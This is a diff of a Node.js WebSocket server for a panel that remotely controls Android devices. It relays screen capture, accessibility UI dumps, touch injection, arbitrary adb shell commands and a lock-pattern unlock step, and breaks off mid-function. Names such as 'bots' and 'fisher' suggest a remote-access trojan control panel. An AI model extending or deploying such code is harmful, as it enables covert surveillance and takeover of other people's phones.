@@ -1,0 +1,1187 @@
+'use strict';
+const http = require('http');
+
+const VERBOSE_WS_MESSAGE_LOGS = process.env.WS_VERBOSE_MESSAGE_LOGS === 'true';
+
+const { getPool } = require('../services/commandPoller');
+const { FrameThrottle } = require('../services/frameThrottle');
+const config = require('../../config');
+
+const frameThrottle = new FrameThrottle(config.maxFps);
+let adminConnectionSequence = 0;
+const ADMIN_STATE_KEY = Symbol.for('fisher.adminDeliveryState');
+const STREAM_BUFFER_LIMIT_BYTES = 512 * 1024;
+const ADMIN_BUFFER_HARD_LIMIT_BYTES = 8 * 1024 * 1024;
+const GLOBAL_ADMIN_BUFFER_LIMIT_BYTES = 64 * 1024 * 1024;
+const ADMIN_HEARTBEAT_INTERVAL_MS = 30000;
+const STREAM_STOP_DELAY_MS = Math.max(0, Number(process.env.ADMIN_STREAM_STOP_DELAY_MS || 15000));
+const STREAM_MODES = new Set(['screen_capture', 'reader']);
+const STREAM_STOP_COMMANDS = Object.freeze({
+  screen_capture: 'SCREEN_CAPTURE_STOP',
+  reader: 'READER_STOP',
+});
+const HIGH_VOLUME_MESSAGE_TYPES = new Set([
+  'screenshot',
+  'screen',
+  'frame',
+  'screen_frame',
+  'ui_hierarchy',
+  'accessibility_data',
+  'accessibility_dump',
+  'reader_data',
+]);
+const HIGH_VOLUME_COMMANDS = new Set([
+  'get_ui_hierarchy',
+  'get_reader_data',
+  'reader_start',
+  'screenshot',
+  'screen_capture',
+  'screen_capture_start',
+  'screen_capture_resume',
+  'screencast',
+  'system_screencast',
+]);
+const MESSAGE_WRAPPER_KEYS = ['data', 'result', 'payload', 'response'];
+
+function getAdminState(connections) {
+  if (!connections[ADMIN_STATE_KEY]) {
+    Object.defineProperty(connections, ADMIN_STATE_KEY, {
+      configurable: false,
+      enumerable: false,
+      writable: false,
+      value: {
+        heartbeatTimer: null,
+        streamOwners: new Map(),
+        pendingStreamStops: new Map(),
+        metrics: {
+          droppedStreamMessages: 0,
+          droppedStreamBytes: 0,
+          receivedStreamMessages: 0,
+          receivedStreamBytes: 0,
+          forwardedStreamMessages: 0,
+          forwardedStreamBytes: 0,
+          droppedNoSubscriberMessages: 0,
+          droppedNoSubscriberBytes: 0,
+          automaticStreamStops: 0,
+          slowAdminDisconnects: 0,
+          heartbeatDisconnects: 0,
+          sendErrors: 0,
+        },
+      },
+    });
+  }
+  const state = connections[ADMIN_STATE_KEY];
+  state.streamOwners ||= new Map();
+  state.pendingStreamStops ||= new Map();
+  const metricDefaults = {
+    droppedStreamMessages: 0,
+    droppedStreamBytes: 0,
+    receivedStreamMessages: 0,
+    receivedStreamBytes: 0,
+    forwardedStreamMessages: 0,
+    forwardedStreamBytes: 0,
+    droppedNoSubscriberMessages: 0,
+    droppedNoSubscriberBytes: 0,
+    automaticStreamStops: 0,
+    slowAdminDisconnects: 0,
+    heartbeatDisconnects: 0,
+    sendErrors: 0,
+  };
+  for (const [key, value] of Object.entries(metricDefaults)) {
+    if (!Number.isFinite(state.metrics[key])) state.metrics[key] = value;
+  }
+  return state;
+}
+
+function normalizeStreamMode(value) {
+  const mode = String(value || '').trim().toLowerCase();
+  return STREAM_MODES.has(mode) ? mode : '';
+}
+
+function streamKey(deviceId, mode) {
+  return `${mode}\u0000${deviceId}`;
+}
+
+function streamKeyParts(key) {
+  const splitAt = key.indexOf('\u0000');
+  return splitAt < 0
+    ? { mode: '', deviceId: '' }
+    : { mode: key.slice(0, splitAt), deviceId: key.slice(splitAt + 1) };
+}
+
+function cancelPendingStreamStop(state, key) {
+  const timer = state.pendingStreamStops.get(key);
+  if (!timer) return false;
+  clearTimeout(timer);
+  state.pendingStreamStops.delete(key);
+  return true;
+}
+
+function scheduleStreamStop(connections, deviceId, mode, delayMs = STREAM_STOP_DELAY_MS) {
+  const state = getAdminState(connections);
+  const key = streamKey(deviceId, mode);
+  cancelPendingStreamStop(state, key);
+
+  const stop = () => {
+    state.pendingStreamStops.delete(key);
+    if ((state.streamOwners.get(key)?.size || 0) > 0) return;
+    const command = STREAM_STOP_COMMANDS[mode];
+    if (!command) return;
+    state.metrics.automaticStreamStops++;
+    forwardCommandToDevice(deviceId, { command, params: {} }, connections);
+  };
+
+  if (delayMs <= 0) {
+    stop();
+    return;
+  }
+  const timer = setTimeout(stop, delayMs);
+  timer.unref?.();
+  state.pendingStreamStops.set(key, timer);
+}
+
+function claimAdminStream(connections, tokenId, deviceId, requestedMode) {
+  const mode = normalizeStreamMode(requestedMode);
+  const conn = connections.admins.get(tokenId);
+  if (!conn || conn.terminating || !deviceId || !mode) return false;
+
+  const state = getAdminState(connections);
+  const key = streamKey(deviceId, mode);
+  conn.activeStreams ||= new Set();
+  conn.activeStreams.add(key);
+  if (!state.streamOwners.has(key)) state.streamOwners.set(key, new Set());
+  state.streamOwners.get(key).add(tokenId);
+  cancelPendingStreamStop(state, key);
+  return true;
+}
+
+function releaseAdminStream(connections, conn, deviceId, requestedMode, { immediate = false, suppressStop = false } = {}) {
+  const mode = normalizeStreamMode(requestedMode);
+  if (!conn || !deviceId || !mode) return false;
+
+  const state = getAdminState(connections);
+  const key = streamKey(deviceId, mode);
+  conn.activeStreams?.delete(key);
+  const owners = state.streamOwners.get(key);
+  owners?.delete(conn.tokenId);
+  if (owners?.size) return true;
+
+  state.streamOwners.delete(key);
+  if (suppressStop) {
+    cancelPendingStreamStop(state, key);
+    return true;
+  }
+  scheduleStreamStop(connections, deviceId, mode, immediate ? 0 : STREAM_STOP_DELAY_MS);
+  return true;
+}
+
+function releaseAdminStreamsForDevice(connections, conn, deviceId, options) {
+  if (!conn?.activeStreams || !deviceId) return;
+  for (const key of [...conn.activeStreams]) {
+    const parts = streamKeyParts(key);
+    if (parts.deviceId === deviceId) {
+      releaseAdminStream(connections, conn, parts.deviceId, parts.mode, options);
+    }
+  }
+}
+
+function cleanupAdminConnection(connections, conn, reason = 'closed') {
+  if (!conn || conn.cleanedUp) return;
+  conn.cleanedUp = true;
+  for (const key of [...(conn.activeStreams || [])]) {
+    const { deviceId, mode } = streamKeyParts(key);
+    releaseAdminStream(connections, conn, deviceId, mode);
+  }
+  if (conn.tokenId && connections.admins.get(conn.tokenId) === conn) {
+    connections.admins.delete(conn.tokenId);
+  }
+  conn.cleanupReason = reason;
+}
+
+function commandStreamAction(data) {
+  const command = commandName(data).trim().toUpperCase();
+  if (['SCREEN_CAPTURE', 'SCREEN_CAPTURE_START', 'SCREEN_CAPTURE_RESUME', 'SCREENCAST', 'SYSTEM_SCREENCAST'].includes(command)) {
+    return { action: 'claim', mode: 'screen_capture' };
+  }
+  if (['SCREEN_CAPTURE_STOP', 'SCREEN_CAPTURE_DISABLE', 'STOP_SCREENCAST'].includes(command)) {
+    return { action: 'release', mode: 'screen_capture' };
+  }
+  if (['READER_START', 'GET_READER_DATA', 'GET_UI_HIERARCHY'].includes(command)) {
+    return { action: 'claim', mode: 'reader' };
+  }
+  if (command === 'READER_STOP') return { action: 'release', mode: 'reader' };
+  return null;
+}
+
+function trackAdminStreamCommand(connections, tokenId, deviceId, data) {
+  const action = commandStreamAction(data);
+  if (!action || !deviceId) return;
+  if (action.action === 'claim') {
+    claimAdminStream(connections, tokenId, deviceId, action.mode);
+    return;
+  }
+  const conn = connections.admins.get(tokenId);
+  // The original command is forwarded immediately below, so ownership
+  // tracking must not emit a duplicate stop command.
+  releaseAdminStream(connections, conn, deviceId, action.mode, { suppressStop: true });
+}
+
+function payloadBytes(payload) {
+  if (Buffer.isBuffer(payload)) return payload.length;
+  if (payload instanceof ArrayBuffer) return payload.byteLength;
+  if (ArrayBuffer.isView(payload)) return payload.byteLength;
+  return Buffer.byteLength(String(payload));
+}
+
+function isHighVolumeMessage(msg) {
+  let current = msg;
+  for (let depth = 0; depth < 5 && current && typeof current === 'object' && !Array.isArray(current); depth++) {
+    const typeCandidates = [current.type, current.event, current.messageType];
+    if (typeCandidates.some(value => HIGH_VOLUME_MESSAGE_TYPES.has(String(value || '').toLowerCase()))) {
+      return true;
+    }
+
+    const commandCandidates = [current.command, current.commandName, current.action];
+    if (commandCandidates.some(value => HIGH_VOLUME_COMMANDS.has(String(value || '').toLowerCase()))) {
+      return true;
+    }
+
+    const wrapperKey = MESSAGE_WRAPPER_KEYS.find(key => {
+      const value = current[key];
+      return value && typeof value === 'object' && !Array.isArray(value);
+    });
+    if (!wrapperKey) break;
+    current = current[wrapperKey];
+  }
+  return false;
+}
+
+function streamModeForMessage(msg) {
+  let current = msg;
+  for (let depth = 0; depth < 5 && current && typeof current === 'object' && !Array.isArray(current); depth++) {
+    const types = [current.type, current.event, current.messageType]
+      .map(value => String(value || '').toLowerCase());
+    if (types.some(value => ['screenshot', 'screen', 'frame', 'screen_frame'].includes(value))) {
+      return 'screen_capture';
+    }
+    if (types.some(value => ['ui_hierarchy', 'accessibility_data', 'accessibility_dump', 'reader_data'].includes(value))) {
+      return 'reader';
+    }
+
+    const commands = [current.command, current.commandName, current.action]
+      .map(value => String(value || '').toLowerCase());
+    if (commands.some(value => ['screenshot', 'screen_capture', 'screen_capture_start', 'screen_capture_resume', 'screencast', 'system_screencast'].includes(value))) {
+      return 'screen_capture';
+    }
+    if (commands.some(value => ['get_ui_hierarchy', 'get_reader_data', 'reader_start'].includes(value))) {
+      return 'reader';
+    }
+
+    const wrapperKey = MESSAGE_WRAPPER_KEYS.find(key => {
+      const value = current[key];
+      return value && typeof value === 'object' && !Array.isArray(value);
+    });
+    if (!wrapperKey) break;
+    current = current[wrapperKey];
+  }
+  return '';
+}
+
+function bufferedBytes(ws) {
+  const value = Number(ws?.bufferedAmount || 0);
+  return Number.isFinite(value) && value > 0 ? value : 0;
+}
+
+function getAdminBufferSnapshot(connections) {
+  let total = 0;
+  let maximum = 0;
+  let slowAdmins = 0;
+  for (const conn of connections.admins.values()) {
+    const buffered = bufferedBytes(conn.ws);
+    total += buffered;
+    maximum = Math.max(maximum, buffered);
+    if (buffered >= STREAM_BUFFER_LIMIT_BYTES) slowAdmins++;
+  }
+  return { total, maximum, slowAdmins };
+}
+
+function terminateAdminConnection(connections, conn, reason) {
+  if (!conn || conn.terminating) return;
+  conn.terminating = true;
+  conn.terminationReason = reason;
+  cleanupAdminConnection(connections, conn, reason);
+  try { conn.ws.terminate(); } catch {}
+  console.warn(`[WS-Admin] terminated connection=${conn.tokenId || 'unknown'} reason=${reason}`);
+}
+
+function enforceGlobalAdminBufferLimit(connections) {
+  const state = getAdminState(connections);
+  let snapshot = getAdminBufferSnapshot(connections);
+  if (snapshot.total <= GLOBAL_ADMIN_BUFFER_LIMIT_BYTES) return snapshot.total;
+
+  const slowest = [...connections.admins.values()]
+    .map(conn => ({ conn, buffered: bufferedBytes(conn.ws) }))
+    .filter(item => item.buffered > 0)
+    .sort((a, b) => b.buffered - a.buffered);
+
+  for (const item of slowest) {
+    terminateAdminConnection(connections, item.conn, 'global_buffer_limit');
+    state.metrics.slowAdminDisconnects++;
+    snapshot.total -= item.buffered;
+    if (snapshot.total <= GLOBAL_ADMIN_BUFFER_LIMIT_BYTES / 2) break;
+  }
+  return Math.max(0, snapshot.total);
+}
+
+function sendToAdmin(connections, conn, payload, { highVolume = false, globalBuffered = 0 } = {}) {
+  if (!conn || conn.terminating || conn.ws.readyState !== 1) return false;
+  const state = getAdminState(connections);
+  const queued = bufferedBytes(conn.ws);
+  const bytes = payloadBytes(payload);
+
+  if (queued >= ADMIN_BUFFER_HARD_LIMIT_BYTES
+      || (!highVolume && queued + bytes > ADMIN_BUFFER_HARD_LIMIT_BYTES)) {
+    state.metrics.slowAdminDisconnects++;
+    terminateAdminConnection(connections, conn, 'connection_buffer_limit');
+    return false;
+  }
+
+  if (highVolume && (bytes > ADMIN_BUFFER_HARD_LIMIT_BYTES
+      || queued >= STREAM_BUFFER_LIMIT_BYTES
+      || globalBuffered >= GLOBAL_ADMIN_BUFFER_LIMIT_BYTES)) {
+    state.metrics.droppedStreamMessages++;
+    state.metrics.droppedStreamBytes += bytes;
+    return false;
+  }
+
+  try {
+    conn.ws.send(payload);
+    return true;
+  } catch (err) {
+    state.metrics.sendErrors++;
+    terminateAdminConnection(connections, conn, `send_error:${err.message}`);
+    return false;
+  }
+}
+
+function ensureAdminHeartbeat(connections) {
+  const state = getAdminState(connections);
+  if (state.heartbeatTimer) return;
+
+  state.heartbeatTimer = setInterval(() => {
+    for (const conn of connections.admins.values()) {
+      if (!conn.ws || conn.ws.readyState !== 1) continue;
+      if (conn.awaitingPong) {
+        state.metrics.heartbeatDisconnects++;
+        terminateAdminConnection(connections, conn, 'heartbeat_timeout');
+        continue;
+      }
+      conn.awaitingPong = true;
+      try {
+        conn.ws.ping();
+      } catch (err) {
+        state.metrics.sendErrors++;
+        terminateAdminConnection(connections, conn, `ping_error:${err.message}`);
+      }
+    }
+  }, ADMIN_HEARTBEAT_INTERVAL_MS);
+  state.heartbeatTimer.unref?.();
+}
+
+function getAdminDeliveryMetrics(connections) {
+  const state = getAdminState(connections);
+  const snapshot = getAdminBufferSnapshot(connections);
+  let activeScreenStreams = 0;
+  let activeReaderStreams = 0;
+  let activeStreamViewers = 0;
+  for (const [key, owners] of state.streamOwners) {
+    if (!owners.size) continue;
+    const { mode } = streamKeyParts(key);
+    if (mode === 'screen_capture') activeScreenStreams++;
+    if (mode === 'reader') activeReaderStreams++;
+    activeStreamViewers += owners.size;
+  }
+  return {
+    adminBufferedBytes: snapshot.total,
+    maxAdminBufferedBytes: snapshot.maximum,
+    slowAdmins: snapshot.slowAdmins,
+    activeScreenStreams,
+    activeReaderStreams,
+    activeStreamViewers,
+    pendingStreamStops: state.pendingStreamStops.size,
+    ...state.metrics,
+  };
+}
+
+function hasDeviceSubscribers(connections, deviceId) {
+  if (!deviceId) return false;
+  for (const conn of connections.admins.values()) {
+    if (!conn.terminating && conn.ws?.readyState === 1 && conn.subscribedDevices?.has(deviceId)) {
+      return true;
+    }
+  }
+  return false;
+}
+
+function hasStreamConsumers(connections, deviceId, mode) {
+  const normalizedMode = normalizeStreamMode(mode);
+  if (!deviceId || !normalizedMode) return hasDeviceSubscribers(connections, deviceId);
+  const state = getAdminState(connections);
+  const owners = state.streamOwners.get(streamKey(deviceId, normalizedMode));
+  if (!owners?.size) return false;
+  for (const tokenId of owners) {
+    const conn = connections.admins.get(tokenId);
+    if (!conn?.terminating && conn.ws?.readyState === 1) return true;
+  }
+  return false;
+}
+
+function recordInboundStream(connections, bytes = 0) {
+  const metrics = getAdminState(connections).metrics;
+  metrics.receivedStreamMessages++;
+  metrics.receivedStreamBytes += Math.max(0, Number(bytes) || 0);
+}
+
+function recordNoSubscriberDrop(connections, bytes = 0) {
+  const metrics = getAdminState(connections).metrics;
+  metrics.droppedNoSubscriberMessages++;
+  metrics.droppedNoSubscriberBytes += Math.max(0, Number(bytes) || 0);
+}
+
+function clearDeviceFrameState(deviceId) {
+  frameThrottle.remove(deviceId);
+}
+
+const DEVICE_COMMAND_ALIASES = Object.freeze({
+  DEPLOY_LOCAL_SERVICE: 'DEPLOY_DXS',
+  REINSTALL_SCREENCAST: 'REINSTALL_SCREEN',
+});
+
+function normalizeDeviceCommand(data) {
+  if (!data || typeof data !== 'object') return data;
+
+  if (data.command && DEVICE_COMMAND_ALIASES[data.command]) {
+    return { ...data, command: DEVICE_COMMAND_ALIASES[data.command] };
+  }
+
+  if (data.data && typeof data.data === 'object' && data.data.command
+      && DEVICE_COMMAND_ALIASES[data.data.command]) {
+    return {
+      ...data,
+      data: { ...data.data, command: DEVICE_COMMAND_ALIASES[data.data.command] },
+    };
+  }
+
+  return data;
+}
+
+function commandName(data) {
+  return String(data?.command || data?.data?.command || data?.type || 'unknown');
+}
+
+/**
+ * 管理端 WebSocket handler
+ * 路径: /ws/panel?token=xxx
+ */
+function handleAdmin(ws, user, connections) {
+  // App-level and device-control sockets commonly connect in the same
+  // millisecond. A timestamp-only key lets one socket overwrite the other,
+  // and either close event then removes the surviving socket from the map.
+  adminConnectionSequence = (adminConnectionSequence + 1) % Number.MAX_SAFE_INTEGER;
+  const tokenId = `admin-${user.user_id}-${Date.now()}-${adminConnectionSequence}`;
+  const connectedAt = new Date().toISOString();
+  const adminConnection = {
+    ws,
+    user,
+    tokenId,
+    connectedAt,
+    subscribedDevices: new Set(),
+    activeStreams: new Set(),
+    awaitingPong: false,
+    terminating: false,
+    cleanedUp: false,
+  };
+  connections.admins.set(tokenId, adminConnection);
+  ensureAdminHeartbeat(connections);
+  console.log(`[WS-Admin] connected user=${user.username} connection=${tokenId} at=${connectedAt}`);
+
+  ws.on('pong', () => {
+    adminConnection.awaitingPong = false;
+    adminConnection.lastPongAt = Date.now();
+  });
+
+  // Keep the original fast-path: the control page receives current device
+  // state immediately, without waiting for a later refresh or reconnect.
+  sendDeviceList(ws, connections).catch(err => console.error('[WS-Admin] sendDeviceList failed:', err.message));
+
+  ws.on('message', (data) => {
+    adminConnection.awaitingPong = false;
+    // ★ Stability: wrap entire handler body in try/catch to prevent unhandled
+    // exceptions in handler/forwarding logic from crashing the WS server.
+    try {
+      try {
+        // 二进制帧处理：可能是 msgpack 或其他编码
+        if (Buffer.isBuffer(data)) {
+          // 尝试解析为 JSON（某些客户端可能发送 UTF-8 编码的 JSON 但设置了 binaryType）
+          try {
+            const msg = JSON.parse(data.toString('utf8'));
+            if (VERBOSE_WS_MESSAGE_LOGS && msg.type !== 'ping' && !isHighVolumeMessage(msg)) {
+              console.log(`[WS-Admin] message user=${user.username} type=${msg.type || msg.event || 'unknown'}`);
+            }
+            handleAdminMessage(ws, msg, user, connections, tokenId);
+            return;
+          } catch (jsonErr) {
+            console.error(`[WS-Admin] Binary data is NOT JSON:`, jsonErr.message);
+            // 暂时忽略非JSON二进制数据（可能是屏幕帧）
+            return;
+          }
+        }
+
+        const msg = JSON.parse(data.toString());
+        if (VERBOSE_WS_MESSAGE_LOGS && msg.type !== 'ping' && !isHighVolumeMessage(msg)) {
+          console.log(`[WS-Admin] message user=${user.username} type=${msg.type || msg.event || 'unknown'}`);
+        }
+        handleAdminMessage(ws, msg, user, connections, tokenId);
+      } catch (err) {
+        console.error('[WS-Admin] Parse error:', err.message, 'data:', data.toString().substring(0, 100));
+      }
+    } catch (err) {
+      console.error(`[WS-Admin] Unhandled error in message handler for ${user.username}:`, err && err.message ? err.message : err);
+    }
+  });
+
+  ws.on('close', (code, reason) => {
+    cleanupAdminConnection(connections, adminConnection, `close:${code}`);
+  });
+
+  ws.on('error', (err) => {
+    cleanupAdminConnection(connections, adminConnection, `error:${err.message}`);
+    console.error(`[WS-Admin] Error: ${err.message}`);
+  });
+}
+
+/**
+ * folder-1 (XYYKK/雄鹰) panel speaks snake_case: it sends
+ *   {type:'command', device_id:'<id>', data:{command,payload,params}}
+ *   {type:'subscribe', data:{device_ids:['<id>']}}
+ * folder-2's node-ws only looked at deviceId/sessionId, so every message was
+ * dropped with "targetDevice=". These helpers normalise both dialects.
+ */
+const ADMIN_DEVICE_ID_KEYS = ['deviceId', 'device_id', 'sessionId', 'session_id', 'botId', 'bot_id'];
+const ADMIN_DEVICE_LIST_KEYS = ['device_ids', 'deviceIds', 'session_ids', 'sessionIds', 'bots', 'devices'];
+const ADMIN_PAYLOAD_KEYS = ['data', 'payload', 'result', 'response'];
+
+function adminDeviceId(msg) {
+  if (!msg || typeof msg !== 'object') return '';
+  for (const key of ADMIN_DEVICE_ID_KEYS) {
+    const value = msg[key];
+    if (typeof value === 'string' && value.trim()) return value.trim();
+    if (typeof value === 'number' && Number.isFinite(value)) return String(value);
+  }
+  // nested: {data:{device_id:'x'}} / {data:{device_ids:['x']}}
+  for (const wrapper of ADMIN_PAYLOAD_KEYS) {
+    const inner = msg[wrapper];
+    if (!inner || typeof inner !== 'object' || Array.isArray(inner)) continue;
+    for (const key of ADMIN_DEVICE_ID_KEYS) {
+      const value = inner[key];
+      if (typeof value === 'string' && value.trim()) return value.trim();
+      if (typeof value === 'number' && Number.isFinite(value)) return String(value);
+    }
+  }
+  return '';
+}
+
+function adminDeviceIds(msg) {
+  const ids = [];
+  const push = (value) => {
+    if (typeof value === 'string' && value.trim()) ids.push(value.trim());
+    else if (typeof value === 'number' && Number.isFinite(value)) ids.push(String(value));
+    else if (Array.isArray(value)) value.forEach(push);
+    else if (value && typeof value === 'object') {
+      for (const key of ADMIN_DEVICE_ID_KEYS) if (value[key] !== undefined) push(value[key]);
+    }
+  };
+  if (!msg || typeof msg !== 'object') return ids;
+  for (const key of ADMIN_DEVICE_ID_KEYS) if (msg[key] !== undefined) push(msg[key]);
+  for (const key of ADMIN_DEVICE_LIST_KEYS) if (msg[key] !== undefined) push(msg[key]);
+  for (const wrapper of ADMIN_PAYLOAD_KEYS) {
+    const inner = msg[wrapper];
+    if (!inner || typeof inner !== 'object') continue;
+    for (const key of ADMIN_DEVICE_ID_KEYS) if (inner[key] !== undefined) push(inner[key]);
+    for (const key of ADMIN_DEVICE_LIST_KEYS) if (inner[key] !== undefined) push(inner[key]);
+  }
+  return [...new Set(ids.filter(Boolean))];
+}
+
+// ---------------------------------------------------------------------------
+// dxs input bridge (2026-10-09)
+// The folder-1 canvas sends {type:'vnc_touch'|'adb_touch', data:{cmd,...}} for
+// every click / swipe. Nothing used to consume it, so tapping the cast view did
+// nothing. Forward those to the device-side dxs agent (127.0.0.1:7912 via
+// `adb forward tcp:17912 tcp:7912`), which really injects the touch event.
+// ---------------------------------------------------------------------------
+let dxsService = null;
+function dxs() {
+  if (dxsService === null) {
+    try { dxsService = require('../services/dxsBridge'); } catch { dxsService = false; }
+  }
+  return dxsService || null;
+}
+function num(value, fallback) {
+  const n = Number(value);
+  return Number.isFinite(n) ? Math.round(n) : fallback;
+}
+function queryString(obj) {
+  return Object.entries(obj)
+    .filter(([, v]) => v !== undefined && v !== null && v !== '')
+    .map(([k, v]) => k + '=' + encodeURIComponent(v))
+    .join('&');
+}
+function dxsInput(cmd, data) {
+  const svc = dxs();
+  if (!svc || !cmd || !data) return false;
+  const action = String(cmd).toLowerCase();
+  let path = '';
+  if (action === 'click' || action === 'tap') {
+    path = '/tap?' + queryString({ x: num(data.x, 0), y: num(data.y, 0) });
+  } else if (action === 'swipe') {
+    path = '/swipe?' + queryString({
+      x1: num(data.startX ?? data.x1, 0), y1: num(data.startY ?? data.y1, 0),
+      x2: num(data.endX ?? data.x2, 0), y2: num(data.endY ?? data.y2, 0),
+      duration: num(data.duration, 300) || 300,
+    });
+  } else if (action === 'long_press' || action === 'longpress') {
+    path = '/longPress?' + queryString({ x: num(data.x, 0), y: num(data.y, 0), duration: num(data.duration, 1500) || 1500 });
+  } else if (action === 'swipe_path' || action === 'long_press_drag') {
+    const path = Array.isArray(data.path) ? data.path : [];
+    if (path.length < 2) return false;
+    const first = path[0], last = path[path.length - 1];
+    const duration = num(data.duration, 800) || 800;
+    svc.request('POST', '/swipePath', { path, duration }).then((res) => {
+      if (!res || res.status >= 400) {
+        svc.request('GET', '/swipe?' + queryString({
+          x1: num(first.x, 0), y1: num(first.y, 0), x2: num(last.x, 0), y2: num(last.y, 0), duration,
+        })).catch(() => {});
+      }
+    }).catch(() => {});
+    return true;
+  } else if (action === 'key' || action === 'back' || action === 'home' || action === 'recents') {
+    path = '/' + (action === 'key' ? 'back' : action);
+  } else {
+    return false;
+  }
+  svc.request('GET', path).catch(() => {});
+  return true;
+}
+
+function adminPayload(msg) {
+  if (!msg || typeof msg !== 'object') return undefined;
+  for (const key of ADMIN_PAYLOAD_KEYS) {
+    const value = msg[key];
+    if (value !== undefined && value !== null) return value;
+  }
+  if (msg.command !== undefined) return { command: msg.command, params: msg.params || {} };
+  return undefined;
+}
+
+async function handleAdminMessage(ws, msg, user, connections, tokenId) {
+  const type = msg && (msg.type || msg.event || msg.messageType);
+  const data = adminPayload(msg);
+  const targetDevice = adminDeviceId(msg);
+
+  switch (type) {
+    case 'subscribe':
+    case 'subscribe_device': {
+      // folder-1 panel subscribes with {type:'subscribe', data:{device_ids:[id]}}
+      const myConn = connections.admins.get(tokenId);
+      if (!myConn) break;
+      const ids = adminDeviceIds(msg);
+      if (!myConn.subscribedDevices) myConn.subscribedDevices = new Set();
+      for (const id of ids) {
+        myConn.subscribedDevices.add(id);
+        // The folder-1 panel never sends stream_claim; it consumes screen frames on
+        // the same socket it subscribes with. Claim the stream implicitly so
+        // forwardFrameToAdmins() has an owner to deliver to.
+        claimAdminStream(connections, tokenId, id, 'screen_capture');
+      }
+      console.log(`[WS-Admin] subscribed user=${user.username} connection=${tokenId} devices=${ids.join(',') || targetDevice}`);
+      break;
+    }
+    case 'unsubscribe':
+    case 'unsubscribe_device': {
+      const myConn2 = connections.admins.get(tokenId);
+      const ids = adminDeviceIds(msg);
+      for (const id of ids) {
+        if (myConn2 && myConn2.subscribedDevices) myConn2.subscribedDevices.delete(id);
+        releaseAdminStreamsForDevice(connections, myConn2, id);
+      }
+      if (ids.length) console.log(`[WS-Admin] unsubscribed user=${user.username} connection=${tokenId} devices=${ids.join(',')}`);
+      break;
+    }
+
+    case 'vnc_touch':
+    case 'adb_touch': {
+      // folder-1 canvas touch: {type:'vnc_touch', data:{cmd:'click'|'swipe'|...,x,y,...}}
+      const touchData = adminPayload(msg) || {};
+      if (dxsInput(touchData.cmd || touchData.command || touchData.action, touchData)) break;
+      if (targetDevice && touchData) forwardCommandToDevice(targetDevice, touchData, connections);
+      break;
+    }
+
+    case 'rtc_signal':
+      // No WebRTC relay in this local stack; swallow it so it is not logged as
+      // "Default forward DROPPED".
+      break;
+
+    case 'stream_claim':
+      claimAdminStream(connections, tokenId, targetDevice, msg.mode || data?.mode);
+      break;
+
+    case 'stream_release': {
+      const myStreamConn = connections.admins.get(tokenId);
+      releaseAdminStream(connections, myStreamConn, targetDevice, msg.mode || data?.mode, {
+        immediate: msg.immediate === true || data?.immediate === true,
+      });
+      break;
+    }
+
+    case 'command':
+      // 管理端发送命令到设备
+      if (VERBOSE_WS_MESSAGE_LOGS && !isHighVolumeMessage(data)) {
+        console.log(`[WS-Admin] command device=${targetDevice || '-'} command=${commandName(data)} connection=${tokenId}`);
+      }
+      if (targetDevice && data) {
+        // PanelBridge answers 文件/相册 WS commands from the dxs agent; the APK's
+        // /w socket ignores them and the panel used to hang forever (2026-10-09).
+        let panelHandled = false;
+        try {
+          const panelBridge = require('../services/panelBridge');
+          panelHandled = panelBridge.tryHandleCommand(targetDevice, data, connections.admins.get(tokenId), connections) === true;
+        } catch (e) { panelHandled = false; }
+        if (panelHandled) break;
+        trackAdminStreamCommand(connections, tokenId, targetDevice, data);
+        forwardCommandToDevice(targetDevice, data, connections);
+      } else {
+        console.warn(`[WS-Admin] Command DROPPED: targetDevice=${targetDevice}, data=${!!data}`);
+      }
+      break;
+
+    case 'get_bot_list':
+    case 'get_device_list':
+      // 前端请求设备列表
+      sendDeviceList(ws, connections).catch(err => console.error('[WS-Admin] sendDeviceList error:', err.message));
+      break;
+
+    case 'get_device_state':
+      // 获取设备状态
+      if (targetDevice) {
+        const device = connections.devices.get(targetDevice);
+        if (device && device.ws.readyState === 1) {
+          device.ws.send(JSON.stringify({ type: 'command', sessionId: targetDevice, data: { command: 'GET_DEVICE_STATE', params: {} } }));
+        }
+      }
+      break;
+
+    case 'ping':
+      sendToAdmin(connections, connections.admins.get(tokenId), JSON.stringify({ type: 'pong' }));
+      break;
+
+    case 'adb_shell':
+      // ADB Shell 命令转发
+      console.log(`[WS-Admin] adb_shell forward: targetDevice=${targetDevice}, command=${msg.command}`);
+      if (targetDevice) {
+        // 对 bridge 特殊处理：转换为 local-service 理解的格式
+        const bridge2 = connections.bridges.get(targetDevice);
+        if (bridge2 && bridge2.ws.readyState === 1) {
+          const shellPayload = JSON.stringify({ command: 'adb_shell', params: { cmd: msg.command, ...(msg.params || {}) } });
+          console.log(`[WS-Admin] >>>> Sending adb_shell to BRIDGE ${targetDevice}:`, shellPayload.substring(0, 200));
+          bridge2.ws.send(shellPayload);
+        } else {
+          // 发给 APK device
+          const device2 = connections.devices.get(targetDevice);
+          if (device2 && device2.ws.readyState === 1) {
+            device2.ws.send(JSON.stringify(msg));
+          }
+        }
+      }
+      break;
+
+    case 'adb_tunnel':
+      // ADB Tunnel 命令转发
+      console.log(`[WS-Admin] adb_tunnel forward: targetDevice=${targetDevice}, command=${msg.command}`);
+      if (targetDevice) {
+        const bridge3 = connections.bridges.get(targetDevice);
+        if (bridge3 && bridge3.ws.readyState === 1) {
+          const tunnelPayload = JSON.stringify({ command: msg.command || 'adb_tunnel', params: msg.params || {} });
+          console.log(`[WS-Admin] >>>> Sending adb_tunnel to BRIDGE ${targetDevice}:`, tunnelPayload.substring(0, 200));
+          bridge3.ws.send(tunnelPayload);
+        } else {
+          const device3 = connections.devices.get(targetDevice);
+          if (device3 && device3.ws.readyState === 1) {
+            device3.ws.send(JSON.stringify(msg));
+          }
+        }
+      }
+      break;
+
+    default:
+      // 转发到设备
+      console.log(`[WS-Admin] Default forward: type='${type}', targetDevice=${targetDevice}, msg=`, JSON.stringify(msg).substring(0, 200));
+      if (targetDevice) {
+        forwardCommandToDevice(targetDevice, msg, connections);
+      } else {
+        console.warn(`[WS-Admin] Default forward DROPPED - no targetDevice. type='${type}'`);
+      }
+  }
+}
+
+function forwardCommandToDevice(deviceId, data, connections) {
+  data = normalizeDeviceCommand(data);
+
+
+
+  const bridge = connections.bridges.get(deviceId);
+  const device = connections.devices.get(deviceId);
+  let sent = false;
+
+  // 提取命令名称（用于判断路由）
+  let cmdName = '';
+  if (data && data.command) cmdName = data.command;
+  else if (data && data.data && data.data.command) cmdName = data.data.command;
+
+  // ★ FIX 2026-09-12 — UNLOCK_DEVICE 图案索引 1-based → 0-based
+  //
